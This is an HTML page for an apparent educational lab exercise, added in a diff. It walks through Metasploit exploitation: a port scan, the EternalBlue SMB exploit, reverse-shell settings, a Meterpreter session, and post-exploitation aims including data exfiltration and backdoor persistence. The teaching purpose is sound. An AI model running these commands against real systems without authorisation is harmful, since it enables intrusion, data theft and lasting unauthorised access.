@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procedure</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="experiment-container">
+        <aside class="sidebar">
+            <ul>
+                <h3><u><b>Experiment 4:-</b></u></h3>
+                <li><a href="index1.html">&#8226; Home</a></li>
+                <li><a href="page4.html">&#8226; Introduction</a></li>
+                <li><a href="aim-meta.html">&#8226; Aim</a></li>
+                <li><a href="theory-meta.html">&#8226; Theory</a></li>
+                <li><a href="procedure-meta.html">&#8226; Procedure</a></li>
+                <li><a href="perform-lab-meta.html">&#8226; Perform Lab</a></li>
+                <li><a href="knowledge-check-meta.html">&#8226; Knowledge Check</a></li>
+                <li><a href="conclusion-meta.html">&#8226; Conclusion</a></li>
+                
+            </ul>
+        </aside>
+
+        <div class="content-box">
+            <h2><u>Procedure</u></h2>
+        
+            <h3><u>Step 1: Install Metasploit</u></h3>
+            <p>To install Metasploit, update your package list and install Metasploit Framework using the following commands:</p>
+            <pre>
+            sudo apt-get update
+            sudo apt-get install metasploit-framework
+            </pre>
+            <p>Type the above command in the terminal to install Metasploit on your system.</p>
+        
+            <h3><u>Step 2: Start the Metasploit Console</u></h3>
+            <p>Launch the Metasploit console by typing the following command:</p>
+            <pre>
+            msfconsole
+            </pre>
+            <p>This opens the Metasploit interface where you can execute exploits and manage sessions.</p>
+        
+            <h3><u>Step 3: Scan the Target for Vulnerabilities</u></h3>
+            <p>Before exploiting a system, gather information about the target. You can use Metasploit's built-in scanner modules or external tools like Nmap to identify vulnerabilities.</p>
+            <pre>
+            use auxiliary/scanner/portscan/tcp
+            set RHOSTS <target-IP>
+            set THREADS 10
+            run
+            </pre>
+            <p>This command performs a TCP port scan on the target system.</p>
+        
+            <h3><u>Step 4: Search for Exploits</u></h3>
+            <p>Search for exploits that match the vulnerabilities discovered in the previous step:</p>
+            <pre>
+            search <vulnerability-name>
+            </pre>
+            <p>For example, if the target has a vulnerable service like SMB, you can search for SMB exploits.</p>
+        
+            <h3><u>Step 5: Select an Exploit</u></h3>
+            <p>Once you've found a suitable exploit, select it using the following command:</p>
+            <pre>
+            use exploit/windows/smb/ms17_010_eternalblue
+            </pre>
+            <p>This example selects the EternalBlue exploit for SMB vulnerability (replace with the actual exploit for your target).</p>
+        
+            <h3><u>Step 6: Configure the Exploit</u></h3>
+            <p>Set the necessary options for the exploit, such as the target IP address and payload. For example:</p>
+            <pre>
+            set RHOST <target-IP>
+            set RPORT 445
+            set LHOST <your-IP>
+            set LPORT 4444
+            </pre>
+            <p>This configures the target system (RHOST), the listening port (LPORT), and the local host (LHOST) for your reverse shell connection.</p>
+        
+            <h3><u>Step 7: Run the Exploit</u></h3>
+            <p>Once configured, execute the exploit:</p>
+            <pre>
+            exploit
+            </pre>
+            <p>If the exploit is successful, you will gain access to the target system, and a session will be established.</p>
+        
+            <h3><u>Step 8: Interact with the Target System</u></h3>
+            <p>Once you have a session, you can interact with the target system using Meterpreter:</p>
+            <pre>
+            sessions -i <session-ID>
+            </pre>
+            <p>This allows you to interact with the compromised system and execute further commands such as gathering system information, capturing keystrokes, or escalating privileges.</p>
+        
+            <h3><u>Step 9: Post-Exploitation</u></h3>
+            <p>Once you've gained control of the system, perform post-exploitation tasks, such as:</p>
+            <ul>
+                <li><b>Privilege Escalation:</b> Attempt to gain higher privileges on the target system.</li>
+                <li><b>Data Exfiltration:</b> Extract valuable data from the target system.</li>
+                <li><b>Persistence:</b> Create backdoors for future access to the target system.</li>
+            </ul>
+        
+            <h3><u>Step 10: Example Output</u></h3>
+            <p>After executing the exploit, you may see output like:</p>
+            <pre>
+            [*] Started reverse TCP handler on <your-IP>:4444 
+            [*] Sending exploit payload to <target-IP>
+            [*] Meterpreter session 1 opened (<your-IP>:4444) at <time>
+            </pre>
+            <p><b>Explanation:</b></p>
+            <ul>
+                <li><b>Started reverse TCP handler:</b> Indicates that a listener is waiting for a connection from the target.</li>
+                <li><b>Sending exploit payload:</b> The exploit is being delivered to the target system.</li>
+                <li><b>Meterpreter session opened:</b> A Meterpreter session has been established, providing full control over the target system.</li>
+            </ul>
+        </div>
+        
+        
+        
+    </div>
+</body>
+</html>
